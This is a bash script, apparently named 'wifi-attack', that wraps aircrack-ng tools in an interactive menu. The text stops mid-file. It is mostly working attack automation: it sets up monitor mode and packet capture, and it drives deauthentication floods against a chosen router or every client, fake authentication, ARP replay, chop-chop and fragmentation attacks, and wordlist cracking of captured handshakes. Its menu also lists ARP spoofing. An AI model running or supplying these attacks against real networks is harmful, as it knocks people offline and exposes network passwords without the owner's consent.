#!/bin/bash

apt-get install gnome-terminal >> /dev/null

BLUE='\033[1;34m'
BOLD='\033[1m'
COLORF='\033[0m'
GREEN='\033[1;32m'
RED='\033[1;31m'

function version(){
VERIFYINTERNET=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' https://google.com)
if [ "$VERIFYINTERNET" != "000" ]
then
VERSION="1.01"
curl -o /tmp/.version --silent https://raw.githubusercontent.com/edubuzzi/wifi-attack/main/version
CHECK=$(cat /tmp/.version)
rm /tmp/.version
fi
}

function doupdate(){
cd ..
rm -rf wifi-attack/
git clone https://github.com/edubuzzi/wifi-attack
cd wifi-attack
chmod +x execute.sh
./execute.sh
}

function update(){
if [ "$VERSION" != "$CHECK" ]
then
echo
sleep 0.05
echo -e "${BOLD}Do you want update wifi-attack to v"$CHECK"?${COLORF}"
sleep 0.05
echo
sleep 0.05
echo -e "${BOLD}${GREEN}(1) YES${COLORF}"
sleep 0.05
echo -e "${BOLD}${RED}(2) NO${COLORF}"
sleep 0.05
echo
sleep 0.05
read -p "CHOICE => " CHOICE
case $CHOICE in
1) doupdate;;
2) principal;;
*) update;;
esac
fi
}

function credits(){
version
echo
sleep 0.05
echo -e "${BOLD}#     #         #######${COLORF}"
sleep 0.05
echo -e "${BOLD}#  #  #     #   #           #${COLORF}"
sleep 0.05
echo -e "${BOLD}#  #  #     #   #           #${COLORF}"
sleep 0.05
echo -e "${BOLD}#  #  #     #   #####       #${COLORF}"
sleep 0.05
echo -e "${BOLD}#  #  #     #   #           #${COLORF}"
sleep 0.05
echo -e "${BOLD}#  #  #     #   #           #${COLORF}"
sleep 0.05
if [ "$VERSION" = "$CHECK" ]
then
echo -e "${BOLD} ## ##      #   #           #     v1.01${COLORF}"
else
echo -e "${BOLD} ## ##      #   #           #     v1.01 ${BLUE}(New Update: v"$CHECK")${COLORF}"
fi
sleep 0.05
echo
sleep 0.05
echo -e "${BOLD}${GREEN}   #"
sleep 0.05
echo -e "${BOLD}${GREEN}  # #     #####   #####    ##     ####   #    #${COLORF}"
sleep 0.05
echo -e "${BOLD}${GREEN} #   #      #       #     #  #   #    #  #   #${COLORF}"
sleep 0.05
echo -e "${BOLD}${GREEN}#     #     #       #    #    #  #       ####${COLORF}"
sleep 0.05
echo -e "${BOLD}${GREEN}#######     #       #    ######  #       #  #${COLORF}"
sleep 0.05
echo -e "${BOLD}${GREEN}#     #     #       #    #    #  #    #  #   #${COLORF}"
sleep 0.05
echo -e "${BOLD}${GREEN}#     #     #       #    #    #   ####   #    #${COLORF}"
sleep 0.05
echo
sleep 0.05
echo -e "${BOLD}===============================================${COLORF}"
sleep 0.05
echo -e "${BOLD}Script developed by:${COLORF} ${BLUE}Eduardo Buzzi${COLORF}"
sleep 0.05
echo -e "${BOLD}More scripts in:${COLORF} ${BLUE}https://github.com/edubuzzi${COLORF}"
sleep 0.05
echo -e "${BOLD}===============================================${COLORF}"
sleep 0.05
update
}

function interfaces(){
echo
INTERFACES=$(ip addr show | grep -v "lo" | grep -v "/" | grep -v "valid" | cut -d '<' -f1 | cut -d ':' -f2 | tr -d " ")
if [ "$INTERFACES" != "" ]
then
echo -e "${BOLD}Your active Network interface(s)${COLORF}"
sleep 0.05
echo -e "${BOLD}${GREEN}$INTERFACES${COLORF}"
sleep 0.05
echo
else
echo -e "${BOLD}${RED}No network adapter found${COLORF}"
sleep 0.05
echo
exit
fi
}

function principal(){
interfaces
sleep 0.05
echo -e "${BOLD}(1) AIRMON-NG${COLORF}"
sleep 0.05
echo -e "${BOLD}(2) AIRODUMP-NG${COLORF}"
sleep 0.05
echo -e "${BOLD}(3) AIREPLAY-NG${COLORF}"
sleep 0.05
echo -e "${BOLD}(4) AIRCRACK-NG${COLORF}"
sleep 0.05
echo -e "${BOLD}(5) ARP SPOOFING${COLORF}"
sleep 0.05
echo -e "${BOLD}(9) EXIT${COLORF}"
sleep 0.05
echo
sleep 0.05
read -p "CHOICE => " CHOICE
case $CHOICE in
1) airmon;;
2) airodump;;
3) aireplay;;
4) menuaircrack;;
5) arpspoof;;
9) exit;;
*) principal;;
esac
}

function airmon(){
interfaces
sleep 0.05
echo -e "${BOLD}(1) AIRMON-NG START${COLORF}"
sleep 0.05
echo -e "${BOLD}(2) AIRMON-NG STOP${COLORF}"
sleep 0.05
echo -e "${BOLD}(9) BACK${COLORF}"
sleep 0.05
echo -e "${BOLD}(99) EXIT${COLORF}"
sleep 0.05
echo
sleep 0.05
read -p "CHOICE => " CHOICE
case $CHOICE in
1) airmonstart;;
2) airmonstop;;
9) principal;;
99) exit;;
*) airmon;;
esac
}

function airmonstart(){
touch /tmp/.airmon >> /dev/null
chmod +x /tmp/.airmon >> /dev/null
echo 'read -p "Managed mode interface to transform into Monitor mode (ex: wlan0) => " INTERFACE' >> /tmp/.airmon
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.airmon
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.airmon
echo 'then' >> /tmp/.airmon
echo 'exit' >> /tmp/.airmon
echo "fi" >> /tmp/.airmon
echo 'read -p "Channel to use Monitor mode => (ex: 12) => " CHANNEL' >> /tmp/.airmon
echo 'airmon-ng start $INTERFACE $CHANNEL >> /dev/null' >> /tmp/.airmon
echo "echo "If you selected a valid interface, '$INTERFACE' is now '${INTERFACE}'mon"" >> /tmp/.airmon
echo 'sleep 4' >> /tmp/.airmon
echo 'exit' >> /tmp/.airmon
gnome-terminal --tab -- "/tmp/.airmon" >> /dev/null
rm /tmp/.airmon >> /dev/null
principal
}

function airmonstop(){
touch /tmp/.airmon >> /dev/null
chmod +x /tmp/.airmon >> /dev/null
echo 'read -p "Monitor mode interface to transform into Managed mode (ex: wlan0mon) => " INTERFACE' >> /tmp/.airmon
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.airmon
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.airmon
echo 'then' >> /tmp/.airmon
echo 'exit' >> /tmp/.airmon
echo "fi" >> /tmp/.airmon
echo 'airmon-ng stop $INTERFACE >> /dev/null' >> /tmp/.airmon
echo 'service NetworkManager start' >> /tmp/.airmon
echo "echo "If you selected a valid interface, '${INTERFACE}'mon"" is now '$INTERFACE' >> /tmp/.airmon
echo 'sleep 4' >> /tmp/.airmon
echo 'exit' >> /tmp/.airmon
gnome-terminal --tab -- "/tmp/.airmon" >> /dev/null
rm /tmp/.airmon >> /dev/null
principal
}

function airodump(){
touch /tmp/.airodump >> /dev/null
chmod +x /tmp/.airodump >> /dev/null
echo 'read -p "Interface in Monitor mode (ex: wlan0mon) => " INTERFACE' >> /tmp/.airodump
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.airodump
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.airodump
echo 'then' >> /tmp/.airodump
echo 'exit' >> /tmp/.airodump
echo "fi" >> /tmp/.airodump
echo 'read -p "Write the captured traffic to a .CAP file? (ex: /root/handshake/capture-wifi2020) [ENTER to dont use] => " WRITE' >> /tmp/.airodump
echo "if [ -z "\"'$WRITE'"\" ]" >> /tmp/.airodump
echo 'then' >> /tmp/.airodump
echo 'WRITE=""' >> /tmp/.airodump
echo "else" >> /tmp/.airodump
echo "WRITE="\"-w '$WRITE'"\"" >> /tmp/.airodump
echo "fi" >> /tmp/.airodump
echo 'read -p "Filter by a cryptographic cipher? (ex: OPN, WEP, WPA1 and WPA2?) [ENTER to dont use] => " ENC' >> /tmp/.airodump
echo "if [ -z "\"'$ENC'"\" ]" >> /tmp/.airodump
echo 'then' >> /tmp/.airodump
echo 'ENC=""' >> /tmp/.airodump
echo "else" >> /tmp/.airodump
echo "ENC="\"-t '$ENC'"\"" >> /tmp/.airodump
echo "fi" >> /tmp/.airodump
echo 'read -p "Use a specific channel? [ENTER to dont use] => " CHANNEL' >> /tmp/.airodump
echo "if [ -z "\"'$CHANNEL'"\" ]" >> /tmp/.airodump
echo 'then' >> /tmp/.airodump
echo 'CHANNEL=""' >> /tmp/.airodump
echo "else" >> /tmp/.airodump
echo "CHANNEL="\"-c '$CHANNEL'"\"" >> /tmp/.airodump
echo "fi" >> /tmp/.airodump
echo 'read -p "Use a specific ESSID? (ex: My WiFi) [ENTER to dont use] => " ESSID' >> /tmp/.airodump
echo "if [ -z "\"'$ESSID'"\" ]" >> /tmp/.airodump
echo 'then' >> /tmp/.airodump
echo 'ESSID=""' >> /tmp/.airodump
echo "else" >> /tmp/.airodump
echo "ESSID="\"--essid '$ESSID'"\"" >> /tmp/.airodump
echo "fi" >> /tmp/.airodump
echo 'read -p "Use a specific BSSID? (ex: F6:EK:SD:6H:J8:D3) [ENTER to dont use] => " BSSID' >> /tmp/.airodump
echo "if [ -z "\"'$BSSID'"\" ]" >> /tmp/.airodump
echo 'then' >> /tmp/.airodump
echo 'BSSID=""' >> /tmp/.airodump
echo "else" >> /tmp/.airodump
echo "BSSID="\"--bssid '$BSSID'"\"" >> /tmp/.airodump
echo "fi" >> /tmp/.airodump
echo 'read -p "Only show associated stations on the network? (y/Y) [ENTER to dont use] => " ASSOCIATED' >> /tmp/.airodump
echo "if [ "\"'$ASSOCIATED'"\" = "\"y"\" ] || [ "\"'$ASSOCIATED'"\" = "\"Y"\" ]" >> /tmp/.airodump
echo 'then' >> /tmp/.airodump
echo 'ASSOCIATED=""' >> /tmp/.airodump
echo "else" >> /tmp/.airodump
echo "ASSOCIATED="\"-a"\"" >> /tmp/.airodump
echo "fi" >> /tmp/.airodump
echo 'read -p "Show WPS Version? (y/Y) [ENTER to dont use] => " WPSv' >> /tmp/.airodump
echo "if [ "\"'$WPSv'"\" = "\"y"\" ] || [ "\"'$WPSv'"\" = "\"Y"\" ]" >> /tmp/.airodump
echo 'then' >> /tmp/.airodump
echo 'WPSv="-W"' >> /tmp/.airodump
echo 'else' >> /tmp/.airodump
echo 'WPSv=""' >> /tmp/.airodump
echo 'fi' >> /tmp/.airodump
echo 'read -p "Display the product manufacturer? (y/Y) [ENTER to dont use] => " MANUFACTURER' >> /tmp/.airodump
echo "if [ "\"'$MANUFACTURER'"\" = "\"y"\" ] || [ "\"'$MANUFACTURER'"\" = "\"Y"\" ]" >> /tmp/.airodump
echo 'then' >> /tmp/.airodump
echo 'MANUFACTURER="-M"' >> /tmp/.airodump
echo 'else' >> /tmp/.airodump
echo 'MANUFACTURER=""' >> /tmp/.airodump
echo 'fi' >> /tmp/.airodump
echo "airodump-ng "'$INTERFACE'" "'$CHANNEL'" "'$CHANNEL'" "'$ESSID'" "'$BSSID'" "'$ASSOCIATED'" "'$ENC'" "'$WPSv'" "'$MANUFACTURER'" "'$WRITE'"" >> /tmp/.airodump
gnome-terminal --tab -- "/tmp/.airodump" >> /dev/null
rm /tmp/.airodump >> /dev/null
principal
}

function aireplay(){
interfaces
sleep 0.05
echo -e "${BOLD}(0) DEAUTH${COLORF}"
sleep 0.05
echo -e "${BOLD}(1) FAKE AUTH${COLORF}"
sleep 0.05
echo -e "${BOLD}(2) INTERATIVE MODE${COLORF}"
sleep 0.05
echo -e "${BOLD}(3) ARP REPLAY${COLORF}"
sleep 0.05
echo -e "${BOLD}(4) CHOP CHOP${COLORF}"
sleep 0.05
echo -e "${BOLD}(5) FRAGMENTATION${COLORF}"
sleep 0.05
echo -e "${BOLD}(6) INJECTION TEST${COLORF}"
sleep 0.05
echo -e "${BOLD}(9) BACK${COLORF}"
sleep 0.05
echo -e "${BOLD}(99) EXIT${COLORF}"
sleep 0.05
echo
sleep 0.05
read -p "CHOICE => " CHOICE
case $CHOICE in
0) deauth;;
1) fakeauth;;
2) interativemode;;
3) arpreplay;;
4) chopchop;;
5) fragmentation;;
6) injectiontest;;
9) principal;;
99) exit;;
*) aireplay;;
esac
}

function deauth (){
touch /tmp/.deuth >> /dev/null
chmod +x /tmp/.deuth >> /dev/null
echo 'read -p "Interface in Monitor Mode (ex: wlan0mon) => " INTERFACE' >> /tmp/.deuth
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.deuth
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.deuth
echo 'then' >> /tmp/.deuth
echo 'exit' >> /tmp/.deuth
echo "fi" >> /tmp/.deuth
echo 'read -p "Number of packets you want to send in the attack (ex: 2) {0 = Infinite Packets} [ ENTER to send 1 Packet ] => " PACKETS' >> /tmp/.deuth
echo "if [ -z "\"'$PACKETS'"\" ]" >> /tmp/.deuth
echo 'then' >> /tmp/.deuth
echo 'PACKETS="1"' >> /tmp/.deuth
echo "fi" >> /tmp/.deuth
echo 'read -p "AP MAC address (Router) => " APMAC' >> /tmp/.deuth
echo "APMAC="\"-a '$APMAC'"\"" >> /tmp/.deuth
echo 'read -p "Station MAC address (Some Device connected to the network) [ENTER to try Deauth everyone] => " STATIONMAC' >> /tmp/.deuth
echo "if [ -z "\"'$STATIONMAC'"\" ]" >> /tmp/.deuth
echo 'then' >> /tmp/.deuth
echo 'STATIONMAC=""' >> /tmp/.deuth
echo "else" >> /tmp/.deuth
echo "STATIONMAC="\"-c '$STATIONMAC'"\"" >> /tmp/.deuth
echo "fi" >> /tmp/.deuth
echo "aireplay-ng -0 "'$PACKETS'" "'$APMAC'" "'$STATIONMAC'" "'$INTERFACE'"" >> /tmp/.deuth
gnome-terminal --tab -- "/tmp/.deuth" >> /dev/null
echo "sleep 4" >> /tmp/.deuth
rm /tmp/.deuth >> /dev/null
aireplay
}

function fakeauth(){
touch /tmp/.fakeauth >> /dev/null
chmod +x /tmp/.fakeauth >> /dev/null
echo 'read -p "Interface in Monitor Mode (ex: wlan0mon) => " INTERFACE' >> /tmp/.fakeauth
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fakeauth
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fakeauth
echo 'then' >> /tmp/.fakeauth
echo 'exit' >> /tmp/.fakeauth
echo "fi" >> /tmp/.fakeauth
echo 'read -p "Number of association requests (ex: 3 to send 3 requests) [ ENTER to send 1 request ] => " ASSOCIATIONREQS' >> /tmp/.fakeauth
echo "if [ -z "\"'$ASSOCIATIONREQS'"\" ]" >> /tmp/.fakeauth
echo 'then' >> /tmp/.fakeauth
echo 'ASSOCIATIONREQS="0"' >> /tmp/.fakeauth
echo "fi" >> /tmp/.fakeauth
echo 'read -p "AP MAC address (Router) [ENTER to dont use] => " APMAC' >> /tmp/.fakeauth
echo "if [ -z "\"'$APMAC'"\" ]" >> /tmp/.fakeauth
echo 'then' >> /tmp/.fakeauth
echo 'APMAC=""' >> /tmp/.fakeauth
echo "else" >> /tmp/.fakeauth
echo "APMAC="\"-a '$APMAC'"\"" >> /tmp/.fakeauth
echo "fi" >> /tmp/.fakeauth
echo 'read -p "AP Name ESSID (Router) [ENTER to dont use] => " APESSID' >> /tmp/.fakeauth
echo "if [ -z "\"'$APESSID'"\" ]" >> /tmp/.fakeauth
echo 'then' >> /tmp/.fakeauth
echo 'APESSID=""' >> /tmp/.fakeauth
echo "else" >> /tmp/.fakeauth
echo "APESSID="\"-e '"$APESSID"'"\"" >> /tmp/.fakeauth
echo "fi" >> /tmp/.fakeauth
echo 'read -p "Fake source MAC address? [ENTER to dont use] => " FAKEMAC' >> /tmp/.fakeauth
echo "if [ -z "\"'$FAKEMAC'"\" ]" >> /tmp/.fakeauth
echo 'then' >> /tmp/.fakeauth
echo 'FAKEMAC=""' >> /tmp/.fakeauth
echo "else" >> /tmp/.fakeauth
echo "FAKEMAC="\"-h '$FAKEMAC'"\"" >> /tmp/.fakeauth
echo "fi" >> /tmp/.fakeauth
echo 'read -p "File containing keystream? (to WEP SKA ex: /root/keystream) [ENTER to dont use] => " KEYSTREAM' >> /tmp/.fakeauth
echo "if [ -z "\"'$KEYSTREAM'"\" ]" >> /tmp/.fakeauth
echo 'then' >> /tmp/.fakeauth
echo 'KEYSTREAM=""' >> /tmp/.fakeauth
echo "else" >> /tmp/.fakeauth
echo "KEYSTREAM="\"-y '$KEYSTREAM'"\"" >> /tmp/.fakeauth
echo "fi" >> /tmp/.fakeauth
echo "aireplay-ng -1 "'$ASSOCIATIONREQS'" "'$APMAC'" "'$APESSID'" "'$FAKEMAC'" "'$KEYSTREAM'" "'$INTERFACE'"" >> /tmp/.fakeauth
gnome-terminal --tab -- "/tmp/.fakeauth" >> /dev/null
echo "sleep 4" >> /tmp/.fakeauth
rm /tmp/.fakeauth >> /dev/null
aireplay
}

function interativemode(){
touch /tmp/.interativemode >> /dev/null
chmod +x /tmp/.interativemode >> /dev/null
touch /tmp/.fakeauth >> /dev/null
chmod +x /tmp/.fakeauth >> /dev/null
echo 'read -p "Interface in Monitor mode [to Interative mode] (ex: wlan0mon) => " INTERFACE' >> /tmp/.interativemode
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.interativemode
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.interativemode
echo 'then' >> /tmp/.interativemode
echo 'exit' >> /tmp/.interativemode
echo "fi" >> /tmp/.interativemode
echo 'read -p "Interface in Monitor mode [to Fake Auth] (ex: wlan0mon) => " INTERFACE' >> /tmp/.fakeauth
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fakeauth
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fakeauth
echo 'then' >> /tmp/.fakeauth
echo 'exit' >> /tmp/.fakeauth
echo "fi" >> /tmp/.fakeauth
echo 'read -p "AP MAC address (Router) [to Interative mode] => " APMAC' >> /tmp/.interativemode
echo 'read -p "AP MAC address (Router) [to Fake Auth] => " APMAC' >> /tmp/.fakeauth
echo "aireplay-ng -1 0 -a "'$APMAC'" "'$INTERFACE'"" >> /tmp/.fakeauth
echo "aireplay-ng -2 -b "'$APMAC'" -t 1 -d FF:FF:FF:FF:FF:FF "'$INTERFACE'"" >> /tmp/.interativemode
gnome-terminal --tab -- "/tmp/.interativemode" >> /dev/null
gnome-terminal --tab -- "/tmp/.fakeauth" >> /dev/null
echo "sleep 4" >> /tmp/.interativemode
echo "sleep 5" >> /tmp/.fakeauth
rm /tmp/.interativemode >> /dev/null
rm /tmp/.fakeauth >> /dev/null
aireplay
}

function arpreplay(){
touch /tmp/.arpreplay >> /dev/null
chmod +x /tmp/.arpreplay >> /dev/null
touch /tmp/.fakeauth >> /dev/null
chmod +x /tmp/.fakeauth >> /dev/null
echo 'read -p "Interface in Monitor mode [to ARP Replay] (ex: wlan0mon) => " INTERFACE' >> /tmp/.arpreplay
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.arpreplay
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.arpreplay
echo 'then' >> /tmp/.arpreplay
echo 'exit' >> /tmp/.arpreplay
echo "fi" >> /tmp/.arpreplay
echo 'read -p "Interface in Monitor mode [to Fake Auth] (ex: wlan0mon) => " INTERFACE' >> /tmp/.fakeauth
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fakeauth
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fakeauth
echo 'then' >> /tmp/.fakeauth
echo 'exit' >> /tmp/.fakeauth
echo "fi" >> /tmp/.fakeauth
echo 'read -p "AP MAC address (Router) [to ARP Replay] => " APMAC' >> /tmp/.arpreplay
echo 'read -p "AP MAC address (Router) [to Fake Auth] => " APMAC' >> /tmp/.fakeauth
echo "aireplay-ng -1 0 -a "'$APMAC'" "'$INTERFACE'"" >> /tmp/.fakeauth
echo "aireplay-ng -3 -b "'$APMAC'" "'$INTERFACE'"" >> /tmp/.arpreplay
gnome-terminal --tab -- "/tmp/.arpreplay" >> /dev/null
gnome-terminal --tab -- "/tmp/.fakeauth" >> /dev/null
echo "sleep 4" >> /tmp/.arpreplay
echo "sleep 5" >> /tmp/.fakeauth
rm /tmp/.arpreplay >> /dev/null
rm /tmp/.fakeauth >> /dev/null
aireplay
}

function chopchop(){
touch /tmp/.chopchop >> /dev/null
chmod +x /tmp/.chopchop >> /dev/null
touch /tmp/.fakeauth >> /dev/null
chmod +x /tmp/.fakeauth >> /dev/null
echo 'read -p "Interface in Monitor mode [to Chop Chop] (ex: wlan0mon) => " INTERFACE' >> /tmp/.chopchop
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.chopchop
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.chopchop
echo 'then' >> /tmp/.chopchop
echo 'exit' >> /tmp/.chopchop
echo "fi" >> /tmp/.chopchop
echo 'read -p "Interface in Monitor mode [to Fake Auth] (ex: wlan0mon) => " INTERFACE' >> /tmp/.fakeauth
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fakeauth
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fakeauth
echo 'then' >> /tmp/.fakeauth
echo 'exit' >> /tmp/.fakeauth
echo "fi" >> /tmp/.fakeauth
echo 'read -p "AP MAC address (Router) [to Chop Chop] => " APMAC' >> /tmp/.chopchop
echo 'read -p "AP MAC address (Router) [to Fake Auth] => " APMAC' >> /tmp/.fakeauth
echo "aireplay-ng -1 0 -a "'$APMAC'" "'$INTERFACE'"" >> /tmp/.fakeauth
echo "aireplay-ng -4 -b "'$APMAC'" "'$INTERFACE'"" >> /tmp/.chopchop
gnome-terminal --tab -- "/tmp/.chopchop" >> /dev/null
gnome-terminal --tab -- "/tmp/.fakeauth" >> /dev/null
echo "sleep 4" >> /tmp/.chopchop
echo "sleep 5" >> /tmp/.fakeauth
rm /tmp/.chopchop >> /dev/null
rm /tmp/.fakeauth >> /dev/null
aireplay
}

function fragmentation(){
touch /tmp/.fragmentation >> /dev/null
chmod +x /tmp/.fragmentation >> /dev/null
touch /tmp/.fakeauth >> /dev/null
chmod +x /tmp/.fakeauth >> /dev/null
echo 'read -p "Interface in Monitor mode [to Fragmentation] (ex: wlan0mon) => " INTERFACE' >> /tmp/.fragmentation
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fragmentation
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fragmentation
echo 'then' >> /tmp/.fragmentation
echo 'exit' >> /tmp/.fragmentation
echo "fi" >> /tmp/.fragmentation
echo 'read -p "Interface in Monitor mode [to Fake Auth] (ex: wlan0mon) => " INTERFACE' >> /tmp/.fakeauth
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fakeauth
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fakeauth
echo 'then' >> /tmp/.fakeauth
echo 'exit' >> /tmp/.fakeauth
echo "fi" >> /tmp/.fakeauth
echo 'read -p "AP MAC address (Router) [to Fragmentation] => " APMAC' >> /tmp/.fragmentation
echo 'read -p "AP MAC address (Router) [to Fake Auth] => " APMAC' >> /tmp/.fakeauth
echo "aireplay-ng -1 0 -a "'$APMAC'" "'$INTERFACE'"" >> /tmp/.fakeauth
echo "aireplay-ng -5 -b "'$APMAC'" "'$INTERFACE'"" >> /tmp/.fragmentation
gnome-terminal --tab -- "/tmp/.fragmentation" >> /dev/null
gnome-terminal --tab -- "/tmp/.fakeauth" >> /dev/null
echo "sleep 4" >> /tmp/.fragmentation
echo "sleep 5" >> /tmp/.fakeauth
rm /tmp/.fragmentation >> /dev/null
rm /tmp/.fakeauth >> /dev/null
aireplay
}

function injectiontest(){
touch /tmp/.injectiontest >> /dev/null
chmod +x /tmp/.injectiontest >> /dev/null
echo 'read -p "Interface in Monitor Mode (ex: wlan0mon) => " INTERFACE' >> /tmp/.injectiontest
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.injectiontest
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.injectiontest
echo 'then' >> /tmp/.injectiontest
echo 'exit' >> /tmp/.injectiontest
echo "fi" >> /tmp/.injectiontest
echo 'read -p "AP MAC address (Router) [ENTER to dont use] => " APMAC' >> /tmp/.injectiontest
echo "if [ -z "\"'$APMAC'"\" ]" >> /tmp/.injectiontest
echo 'then' >> /tmp/.injectiontest
echo 'APMAC=""' >> /tmp/.injectiontest
echo "else" >> /tmp/.injectiontest
echo "APMAC="\"-a '$APMAC'"\"" >> /tmp/.injectiontest
echo "fi" >> /tmp/.injectiontest
echo 'read -p "AP ESSID (Router) [ENTER to dont use] => " APESSID' >> /tmp/.injectiontest
echo "if [ -z "\"'$APESSID'"\" ]" >> /tmp/.injectiontest
echo 'then' >> /tmp/.injectiontest
echo 'APESSID=""' >> /tmp/.injectiontest
echo "else" >> /tmp/.injectiontest
echo "APESSID="\"-e '"$APESSID"'"\"" >> /tmp/.injectiontest
echo "fi" >> /tmp/.injectiontest
echo "aireplay-ng -9 "'$INTERFACE'" "'$APMAC'" "'$APESSID'"" >> /tmp/.injectiontest
gnome-terminal --tab -- "/tmp/.injectiontest" >> /dev/null
echo "sleep 4" >> /tmp/.injectiontest
rm /tmp/.injectiontest >> /dev/null
aireplay
}

function menuaircrack(){
interfaces
sleep 0.05
echo -e "${BOLD}(1) CRACK PASSWORD WITH WORDLIST${COLORF}"
sleep 0.05
echo -e "${BOLD}(2) SEARCH HANDSHAKE AND PMKID IN .cap FILE${COLORF}"
sleep 0.05
echo -e "${BOLD}(9) BACK${COLORF}"
sleep 0.05
echo -e "${BOLD}(99) EXIT${COLORF}"
sleep 0.05
echo
sleep 0.05
read -p "CHOICE => " CHOICE
case $CHOICE in
1) aircrack;;
2) search;;
9) principal;;
99) exit;;
*) airmon;;
esac
}

function aircrack(){
touch /tmp/.aircrack >> /dev/null
chmod +x /tmp/.aircrack >> /dev/null
echo 'read -p "Path and file name for the file you want to crack the password (ex: /root/handshake.cap) => " FILE' >> /tmp/.aircrack
echo "if [ ! -f "\"'$FILE'"\" ]" >> /tmp/.aircrack
echo "then" >> /tmp/.aircrack
echo "exit" >> /tmp/.aircrack
echo "fi" >> /tmp/.aircrack
echo 'read -p "Path and name of the wordlist you want to use to crack the password (ex: /root/wordlist.txt) => " WORDLIST' >> /tmp/.aircrack
echo "if [ ! -f "\"'$WORDLIST'"\" ]" >> /tmp/.aircrack
echo "then" >> /tmp/.aircrack
echo "exit" >> /tmp/.aircrack
echo "fi" >> /tmp/.aircrack
echo "WORDLIST="\"-w '$WORDLIST'"\"" >> /tmp/.aircrack
echo 'read -p "Filter by a cryptographic cipher? (1 = WEP, 2 = WPA/WPA2 PSK) [ENTER to dont use] => " ENC' >> /tmp/.aircrack
echo "case "'$ENC'" in" >> /tmp/.aircrack
echo "1) ENC="\"-a '$ENC'"\";;" >> /tmp/.aircrack
echo "2) ENC="\"-a '$ENC'"\";;" >> /tmp/.aircrack
echo '*) ENC="";;' >> /tmp/.aircrack
echo "esac" >> /tmp/.aircrack
echo 'read -p "Use a specific ESSID? (ex: My WiFi) [ENTER to dont use] => " ESSID' >> /tmp/.aircrack
echo "if [ -z "\"'$ESSID'"\" ]" >> /tmp/.aircrack
echo 'then' >> /tmp/.aircrack
echo 'ESSID=""' >> /tmp/.aircrack
echo "else" >> /tmp/.aircrack
echo "ESSID="\"-e '$ESSID'"\"" >> /tmp/.aircrack
echo "fi" >> /tmp/.aircrack
echo 'read -p "Use a specific BSSID? (ex: F6:EK:SD:6H:J8:D3) [ENTER to dont use] => " BSSID' >> /tmp/.aircrack
echo "if [ -z "\"'$BSSID'"\" ]" >> /tmp/.aircrack
echo 'then' >> /tmp/.aircrack
echo 'BSSID=""' >> /tmp/.aircrack
echo "else" >> /tmp/.aircrack
echo "BSSID="\"-b '$BSSID'"\"" >> /tmp/.aircrack
echo "fi" >> /tmp/.aircrack
echo 'read -p "Number of CPUs to be used [ENTER to use All CPUs] => " CPUS' >> /tmp/.aircrack
echo "if [ -z "\"'$CPUS'"\" ]" >> /tmp/.aircrack
echo 'then' >> /tmp/.aircrack
echo 'CPUS=""' >> /tmp/.aircrack
echo "else" >> /tmp/.aircrack
echo "CPUS="\"-p '$CPUS'"\"" >> /tmp/.aircrack
echo "fi" >> /tmp/.aircrack
echo "aircrack-ng "'$WORDLIST'" "'$ENC'" "'$ESSID'" "'$BSSID'" "'$CPUS'" "'$SILENT'" "'$FILE'"" >> /tmp/.aircrack
gnome-terminal --tab -- "/tmp/.aircrack" >> /dev/null
echo "echo" >> /tmp/.aircrack
echo 'read -p "Process finished, write anything to close the Terminal => " FINISH' >> /tmp/.aircrack
echo "case "'$FINISH'" in" >> /tmp/.aircrack
echo '*) exit;;' >> /tmp/.aircrack
echo "esac" >> /tmp/.aircrack
rm /tmp/.aircrack >> /dev/null
menuaircrack
}

function search(){
